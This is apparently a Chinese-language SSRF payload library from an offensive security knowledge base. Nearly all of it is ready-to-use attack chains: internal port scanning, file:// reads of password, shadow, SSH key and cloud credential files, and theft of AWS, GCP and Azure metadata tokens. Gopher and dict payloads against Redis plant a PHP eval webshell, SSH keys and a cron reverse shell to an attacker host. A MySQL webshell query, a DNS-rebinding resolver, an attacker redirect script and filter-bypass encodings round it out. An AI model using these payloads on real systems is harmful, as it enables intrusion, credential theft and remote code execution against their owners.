# SSRF — 核心 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:基础 SSRF / 协议利用(gopher / dict / file) / 绕过技术 / DNS Rebinding / 攻击 Redis / 攻击 MySQL + SSRF 通用绕过三件套(UA / DNS 重绑定 / 302)。
> 云元数据 SSRF 见 [`11-cloud.md`](11-cloud.md)。缓存投毒见 [`12-cache.md`](12-cache.md)。

---


### 基础SSRF攻击  `ssrf-basic`
服务端请求伪造基础攻击技术
子类：**基础攻击** · tags: `ssrf` `server-side` `request`

**前置条件：** 存在URL输入点；服务器会请求用户提供的URL

**攻击链：**

**1. 1. 探测SSRF**
_探测SSRF漏洞_
```
输入URL: http://127.0.0.1
输入URL: http://localhost
输入URL: http://[::1]
观察服务器响应是否包含内网信息
```

**2. 2. 扫描内网端口**
_扫描内网端口_
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
根据响应差异判断端口开放状态
```

**3. 3. 访问内网服务**
_访问内网服务_
```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
访问内网管理界面或敏感服务
```

**4. 4. 读取本地文件**
_读取本地文件_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
使用file协议读取本地文件
```

**WAF/EDR 绕过变体：**

**1. IP格式绕过**
_使用不同IP格式绕过_
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
```

**2. URL解析差异**
_利用URL解析差异_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
利用URL解析差异绕过
```

**3. DNS重绑定**
_DNS重绑定攻击_
```
使用DNS重绑定服务:
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

---

### AWS元数据攻击  `ssrf-cloud-aws`
利用SSRF访问AWS EC2元数据服务
子类：**云元数据** · tags: `ssrf` `aws` `metadata` `cloud`

**前置条件：** 存在SSRF漏洞；目标运行在AWS EC2上

**攻击链：**

**1. 1. 访问元数据服务**
_访问AWS元数据服务_
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```

**2. 2. 获取IAM凭证**
_获取IAM临时凭证_
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
获取角色名后:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

**3. 3. 获取用户数据**
_获取实例用户数据_
```
http://169.254.169.254/latest/user-data/
可能包含敏感信息、API密钥、启动脚本
```

**4. 4. 使用IMDSv2绕过**
_绕过IMDSv2保护_
```
如果IMDSv2被强制:
1. 先获取token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. 使用token访问:
Header: X-aws-ec2-metadata-token: TOKEN
```

**WAF/EDR 绕过变体：**

**1. IP编码变体绕过**
_通过十进制、十六进制、八进制及IPv6映射等IP地址编码方式绕过169.254.169.254黑名单检测_
```
# 十进制整数:
http://2852039166/latest/meta-data/
# 十六进制:
http://0xA9FEA9FE/latest/meta-data/
# 八进制:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6映射:
http://[::ffff:169.254.169.254]/latest/meta-data/
# 混合编码:
http://0xA9.0376.169.0xFE/latest/meta-data/
```

**2. DNS重绑定与重定向链绕过**
_利用DNS重绑定使域名在验证时解析为安全IP而实际请求时解析为元数据地址，或通过HTTP重定向链和非标准协议绕过_
```
# DNS重绑定(使用rebind服务):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# 第一次解析到允许的IP，第二次解析到169.254.169.254

# 重定向链:
# 在attacker.com设置302跳转到http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema变体:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```

---

### GCP元数据攻击  `ssrf-cloud-gcp`
利用SSRF攻击Google Cloud元数据服务
子类：**GCP元数据** · tags: `ssrf` `gcp` `cloud` `metadata`

**前置条件：** 存在SSRF漏洞；目标运行在GCP环境

**攻击链：**

**1. 1. 访问元数据服务**
_访问GCP元数据端点_
```
http://metadata.google.internal/computeMetadata/v1/
需要添加Header:
Metadata-Flavor: Google
```

**2. 2. 获取访问令牌**
_获取服务账户令牌_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
返回OAuth访问令牌
```

**3. 3. 获取服务账户信息**
_获取服务账户邮箱和别名_
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```

**4. 4. 获取项目信息**
_获取项目ID_
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```

**5. 5. 获取SSH密钥**
_获取SSH公钥_
```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```

**6. 6. 获取Kubelet凭据**
_获取GKE集群信息_
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
获取Kubernetes环境变量
```

**WAF/EDR 绕过变体：**

**1. 使用IP地址**
_绕过域名过滤_
```
http://169.254.169.254/computeMetadata/v1/
使用内网IP代替域名
```

---

### Azure元数据攻击  `ssrf-cloud-azure`
利用SSRF攻击Azure元数据服务
子类：**Azure元数据** · tags: `ssrf` `azure` `cloud` `metadata`

**前置条件：** 存在SSRF漏洞；目标运行在Azure环境

**攻击链：**

**1. 1. 访问元数据服务**
_访问Azure元数据端点_
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
需要添加Header:
Metadata: true
```

**2. 2. 获取访问令牌**
_获取托管身份令牌_
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
返回Azure AD访问令牌
```

**3. 3. 获取计算信息**
_获取计算实例信息_
```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
返回VM详细信息
```

**4. 4. 获取网络信息**
_获取网络配置_
```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
返回网络配置信息
```

**5. 5. 获取用户数据**
_获取用户数据_
```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
返回用户自定义数据
```

**WAF/EDR 绕过变体：**

**1. 绕过Metadata头检查**
_绕过请求头验证_
```
使用HTTP请求走私或重定向绕过Metadata头检查
```

---

### SSRF协议利用  `ssrf-protocol`
利用各种协议进行SSRF攻击
子类：**协议利用** · tags: `ssrf` `protocol` `file` `gopher`

**前置条件：** 存在SSRF漏洞；服务器支持多种协议

**攻击链：**

**1. 1. File协议**
_使用File协议读取文件_
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
读取本地文件
```

**2. 2. Dict协议**
_使用Dict协议探测服务_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
探测内网服务
```

**3. 3. Gopher协议**
_使用Gopher协议攻击内网服务_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
构造Redis命令
```

**4. 4. LDAP协议**
_使用LDAP协议_
```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
触发LDAP查询
```

**5. 5. TFTP协议**
_使用TFTP协议_
```
tftp://attacker.com/file
触发TFTP请求
```

**WAF/EDR 绕过变体：**

**1. 协议大小写绕过**
_大小写混合绕过_
```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```

---

### Gopher协议攻击  `ssrf-gopher`
利用Gopher协议攻击内网服务
子类：**Gopher攻击** · tags: `ssrf` `gopher` `redis` `mysql`

**前置条件：** 存在SSRF漏洞；服务器支持Gopher协议

**攻击链：**

**1. 1. Gopher基础格式**
_Gopher协议格式_
```
gopher://<host>:<port>/_<payload>
_后面是实际发送的数据
需要URL编码
```

**2. 2. 攻击Redis**
_写入cron任务反弹Shell_
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

**3. 3. 攻击MySQL**
_攻击MySQL数据库_
```
gopher://127.0.0.1:3306/_<MySQL协议数据包>
需要构造MySQL协议格式的数据
```

**4. 4. 攻击FastCGI**
_攻击PHP-FPM_
```
gopher://127.0.0.1:9000/_<FastCGI数据包>
构造PHP-FPM攻击载荷
```

**5. 5. 发送HTTP请求**
_发送HTTP请求_
```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
构造HTTP请求攻击内网
```

**WAF/EDR 绕过变体：**

**1. 双重URL编码**
_双重URL编码绕过_
```
gopher://127.0.0.1:6379/_%252a%250d%250a...
双重编码绕过
```

---

### Dict协议攻击  `ssrf-dict`
利用Dict协议探测和攻击内网服务
子类：**Dict协议** · tags: `ssrf` `dict` `redis` `memcached`

**前置条件：** 存在SSRF漏洞；服务器支持Dict协议

**攻击链：**

**1. 1. Dict协议格式**
_Dict协议基础格式_
```
dict://<host>:<port>/<command>
发送命令到目标服务
```

**2. 2. 探测Redis**
_探测Redis服务_
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
获取Redis信息
```

**3. 3. 探测Memcached**
_探测Memcached服务_
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
获取Memcached信息
```

**4. 4. Redis写入文件**
_写入WebShell_
```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**WAF/EDR 绕过变体：**

**1. 编码绕过**
_URL编码绕过关键字过滤_
```
dict://127.0.0.1:6379/%73%65%74%20...
URL编码命令
```

---

### File协议攻击  `ssrf-file`
利用File协议读取本地文件
子类：**File协议** · tags: `ssrf` `file` `lfi` `read`

**前置条件：** 存在SSRF漏洞；服务器支持File协议

**攻击链：**

**1. 1. Linux敏感文件**  _[linux]_
_读取Linux敏感文件_
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```

**2. 2. Windows敏感文件**  _[windows]_
_读取Windows敏感文件_
```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```

**3. 3. Web配置文件**
_读取Web应用配置_
```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```

**4. 4. 云环境文件**
_读取云环境凭据_
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```

**5. 5. SSH密钥**
_读取SSH私钥_
```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```

**WAF/EDR 绕过变体：**

**1. 大小写混合**
_大小写混合绕过_
```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```

---

### SSRF绕过技术  `ssrf-bypass`
各种绕过SSRF过滤的技术
子类：**绕过技术** · tags: `ssrf` `bypass` `waf` `filter`

**前置条件：** 存在SSRF漏洞；存在过滤机制

**攻击链：**

**1. 1. IP格式绕过**
_使用不同IP格式表示127.0.0.1_
```
http://0177.0.0.1 (八进制)
http://2130706433 (十进制)
http://0x7f000001 (十六进制)
http://127.1 (简写)
http://127.0.0.1.nip.io (DNS重绑定)
http://127.0.0.1.xip.io
```

**2. 2. URL解析差异**
_利用URL解析差异_
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```

**3. 3. 重定向绕过**
_利用HTTP重定向_
```
http://attacker.com/redirect?url=http://127.0.0.1
使用短链接服务重定向到内网
```

**4. 4. DNS重绑定**
_DNS重绑定攻击_
```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
第一次解析为外网IP，第二次解析为内网IP
```

**5. 5. IPv6绕过**
_使用IPv6地址绕过_
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
使用IPv6本地地址
```

**6. 6. 编码绕过**
_使用编码绕过_
```
http://%31%32%37%2e%30%2e%30%2e%31 (URL编码)
http://127.0.0.1%00attacker.com (空字节)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```

**WAF/EDR 绕过变体：**

**1. 组合绕过**
_组合多种绕过技术_
```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
多种格式组合
```

---

### DNS重绑定攻击  `ssrf-dns-rebinding`
利用DNS重绑定绕过SSRF防护
子类：**DNS重绑定** · tags: `ssrf` `dns` `rebinding` `bypass`

**前置条件：** 存在SSRF漏洞；存在DNS解析验证

**攻击链：**

**1. 1. DNS重绑定原理**
_DNS重绑定原理_
```
第一次DNS查询：返回外网IP（通过验证）
第二次DNS查询：返回内网IP（实际访问）
利用TTL=0或短TTL
```

**2. 2. 使用公开服务**
_使用DNS重绑定服务_
```
http://7f000001.cip.cc (解析为127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```

**3. 3. 自建DNS服务器**
_自建DNS重绑定服务器_
```
# 使用dnspython搭建
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # 外网IP
        else:
            return "127.0.0.1"  # 内网IP
```

**4. 4. 攻击流程**
_完整攻击流程_
```
1. 注册域名指向自建DNS服务器
2. 配置DNS服务器返回两个IP
3. 使用该域名发起SSRF请求
4. 第一次验证通过，第二次访问内网
```

**WAF/EDR 绕过变体：**

**1. 多IP响应**
_利用多IP响应_
```
DNS响应包含多个A记录
服务器可能选择不同的IP
```

---

### SSRF攻击Redis  `ssrf-redis`
利用SSRF攻击内网Redis服务
子类：**Redis攻击** · tags: `ssrf` `redis` `rce` `webshell`

**前置条件：** 存在SSRF漏洞；内网存在未授权Redis

**攻击链：**

**1. 1. 探测Redis**
_探测Redis服务_
```
dict://127.0.0.1:6379/info
或使用Gopher:
gopher://127.0.0.1:6379/_INFO
```

**2. 2. 写入WebShell**
_写入WebShell到Web目录_
```
# 使用Dict协议
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```

**3. 3. 写入SSH公钥**
_写入SSH公钥_
```
dict://127.0.0.1:6379/set%20ssh%20"ssh-rsa AAAA..."
dict://127.0.0.1:6379/config%20set%20dir%20/root/.ssh
dict://127.0.0.1:6379/config%20set%20dbfilename%20authorized_keys
dict://127.0.0.1:6379/save
```

**4. 4. 写入Cron任务**  _[linux]_
_写入Cron反弹Shell_
```
dict://127.0.0.1:6379/set%20cron%20"*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1"
dict://127.0.0.1:6379/config%20set%20dir%20/var/spool/cron
dict://127.0.0.1:6379/config%20set%20dbfilename%20root
dict://127.0.0.1:6379/save
```

**5. 5. 主从复制RCE**
_主从复制RCE_
```
# 使用redis-rogue-server
python redis-rogue-server.py --rhost=127.0.0.1 --lhost=attacker.com
利用Redis主从复制加载恶意模块
```

**WAF/EDR 绕过变体：**

**1. Gopher协议构造**
_使用Gopher协议_
```
使用Gopher协议构造完整的Redis命令序列
可以绕过Dict协议限制
```

---

### SSRF攻击MySQL  `ssrf-mysql`
利用SSRF攻击内网MySQL服务
子类：**MySQL攻击** · tags: `ssrf` `mysql` `gopher` `database`

**前置条件：** 存在SSRF漏洞；内网存在MySQL服务；知道MySQL用户名

**攻击链：**

**1. 1. MySQL协议基础**
_MySQL协议基础_
```
MySQL通信协议:
- 握手包
- 认证包
- 命令包
需要构造符合协议的数据
```

**2. 2. 使用Gopher攻击MySQL**
_Gopher协议攻击MySQL_
```
# 构造MySQL协议数据包
# 需要使用工具生成
gopher://127.0.0.1:3306/_[MySQL Protocol Data]

# 使用sqlmap
gopher://127.0.0.1:3306/_[sqlmap生成的payload]
```

**3. 3. 使用工具生成Payload**
_使用工具生成Payload_
```
# 使用Gopherus工具
python gopherus.py --exploit mysql
输入用户名和SQL命令
生成Gopher URL

# 或使用mysql_gopher_attack工具
```

**4. 4. 执行SQL命令**
_执行SQL命令_
```
SELECT * FROM users;
SELECT user(), version();
写入WebShell:
SELECT "<?php @eval($_POST[cmd]);?>" INTO OUTFILE "/var/www/html/shell.php";
```

**WAF/EDR 绕过变体：**

**1. 无密码MySQL**
_利用空密码配置_
```
如果MySQL允许空密码连接
可以更容易构造攻击载荷
```

---


---

## 通用绕过补充

### SSRF 通用绕过三件套 — UA 头 / DNS 重绑定 / 302 重定向

服务端做了 URL 白名单 / IP 校验 / 私网段过滤,但**校验时拉到的内容与实际请求时拉到的不是同一份**。以下三种绕过技术分别打"User-Agent 分支"、"DNS 解析时间窗"、"重定向跟随"。

#### 1. UA 头分支绕过(常见于头像 / 图片下载接口)

后端按 `User-Agent` 分流,内部代理 / 业务客户端走"无校验"分支,普通浏览器 UA 走"严格校验"分支。

```php
<?php
$_user_agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($_user_agent, 'go-httpclient') !== false) {
    // 业务内部走客户端,直接跳到内部域不校验
    header("Location: http://internal.test.qq.com/flag.html");
} else {
    // 普通用户走安全外链
    header("Location: https://example.com/public.png");
}
?>
```

```text
# 绕过:把 UA 改成业务客户端
curl -A "go-httpclient/1.0" "https://target.com/fetch?url=https://attacker.example/img"
curl -A "Java/1.8.0_271" ...
curl -A "okhttp/4.9.0" ...
curl -A "python-requests/2.28" ...
curl -A "PostmanRuntime/7.30" ...

# 看响应是否包含内部域内容(304 / Location: 内网 / 内容长度异常)即可判断分支命中
```

**典型触发点**:头像上传(URL 模式)、富文本"插入网络图片"、Webhook 配置、邮件附件预览、URL 链接预览。

#### 2. DNS 重绑定(TOCTOU)

服务端先解析 DNS 做白名单校验,然后再次解析发起请求。**两次解析之间 DNS 记录被切换** → 校验时是公网 IP、请求时是内网 IP。

```text
# 在线 rebinder(测试环境;实战自架避免与他人冲突)
https://lock.cmpxchg8b.com/rebinder.html?1   # 1.1.1.1 ↔ 127.0.0.1 交替
https://lock.cmpxchg8b.com/rebinder.html?2   # 自定义 IP

# 关键参数
- 设置极短 TTL(0 或 1)避免后端缓存解析
- 使用 round-robin 把 [公网 IP, 127.0.0.1] 两条 A 记录交替返回
- 127.0.0.1 的变种(校验逻辑只 blacklist 字面 127.0.0.1 时):
    127.1
    127.0.1
    0.0.0.0
    0
    0x7f000001
    2130706433        # decimal
    017700000001      # octal
    [::1]
    [::ffff:7f00:1]
    localtest.me      # 解析到 127.0.0.1 的公网域名
    spoofed.burpcollaborator.net

# 自建工具:singularity / dns-rebind / rbndr
```

**何时用**:
- 后端代码出现 `parse_url + gethostbyname + 白名单 + curl_exec` 两段式
- WAF 只看请求 URL 的字面 host,不看实际连接到的 IP
- AWS metadata(169.254.169.254)被字面 blacklist 时

#### 3. 302 重定向跟随绕过

服务端只对**用户提交的 URL**做校验,但 `curl --location` / `requests follow_redirects=True` 会跟随 302 跳到任意 URL。在攻击者域上挂 `header("Location: http://internal/")` 即可。

```php
<?php
// 攻击者控制的服务 — attacker.example/redir.php
header("Location: http://127.0.0.1:6379/");   // Redis
// header("Location: http://169.254.169.254/latest/meta-data/");  // AWS metadata
// header("Location: gopher://127.0.0.1:6379/_...");  // gopher 内网横向
// header("Location: file:///etc/passwd");  // file:// 本地读
exit;
```

```text
# 触发:在 SSRF 输入框填 attacker 域,后端校验通过(指向公网)→ 跟随重定向到内网
POST /fetch HTTP/1.1
url=https://attacker.example/redir.php

# 链式重定向规避协议限制:
# 后端只允许 https → attacker.example/redir1 (https)
#                → attacker.example/redir2 (http)  ← 协议切换
#                → http://127.0.0.1:6379/  ← 最终落点
```

**变种**:
- HTTP `Refresh:` 头(部分 HTTP 客户端跟随)
- HTML `<meta http-equiv="refresh">`(headless 渲染场景)
- 30x 链多跳,中间穿插不同协议(http → https → http → gopher / dict / file)

**真实命中要点(三件套合体)**:
1. 用 **UA 头**找有内部分支的接口(看响应特征)
2. 用 **DNS 重绑定**绕过字面 IP 黑名单
3. 用 **302 重定向**绕过协议白名单 + 触发 gopher / file 落点

OOB 验证用厂商提供的 SSRF 测试平台或自架 interactsh,不要用公共 DNSLog。

---

---

← 回 [00-index.md](00-index.md) · 相关:[`11-cloud.md`](11-cloud.md) · [`12-cache.md`](12-cache.md)
